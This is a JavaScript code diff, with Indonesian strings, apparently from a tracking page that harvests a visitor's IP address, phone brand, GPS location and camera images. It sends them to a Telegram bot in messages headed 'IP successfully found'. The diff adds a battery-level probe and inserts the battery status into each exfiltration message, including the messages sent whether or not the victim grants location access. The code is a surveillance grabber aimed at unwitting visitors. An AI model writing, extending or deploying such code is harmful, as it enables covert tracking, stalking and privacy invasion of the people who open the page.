@@ -54,6 +54,21 @@ if (/Hisense/i.test(ua)) return "Hisense";
   return "Tidak diketahui";
 }
 
+async function getBatteryInfo() {
+  try {
+    if (navigator.getBattery) {
+      const battery = await navigator.getBattery();
+      const persen = Math.round(battery.level * 100);
+      const charging = battery.charging ? "🔌 Charging" : "🔋 Tidak charging";
+      return `${persen}% (${charging})`;
+    } else {
+      return "Tidak tersedia";
+    }
+  } catch {
+    return "Tidak diketahui";
+  }
+};
+
 async function captureCamera(facing) {
   return new Promise((resolve, reject) => {
     navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: facing } } })
@@ -118,6 +133,7 @@ async function kirimPesanTelegram(pesan) {
   const pesanAwal = `╭──「 IP berhasil ditemukan! 」──
 │🌐 Status: MENUNGGU IZIN LOKASI
 │📡 IP: ${ip}
+│🔋 Batrai: ${batre}
 │📱 Merek hp: ${merek}
 ╰───────────────────`;
   await kirimPesanTelegram(pesanAwal);
@@ -135,6 +151,7 @@ navigator.geolocation.getCurrentPosition(
 │🌐 Status: MENGIZINKAN LOKASI
 │📡 IP: ${ip}
 │📱 Merek hp: ${merek}
+│🔋 Batrai: ${batre}
 │📍 Lokasi: ${gmaps}
 │📷 Sedang meminta akses kamera...
 ╰───────────────────`;
@@ -149,6 +166,7 @@ navigator.geolocation.getCurrentPosition(
     const pesan = `╭──「 IP berhasil ditemukan! 」──
 │🌐 Status: MENOLAK LOKASI
 │📡 IP: ${ip}
+│🔋 Batrai: ${batre}
 │📱 Merek hp: ${merek}
 │📷 Sedang meminta akses kamera...
 ╰───────────────────`;
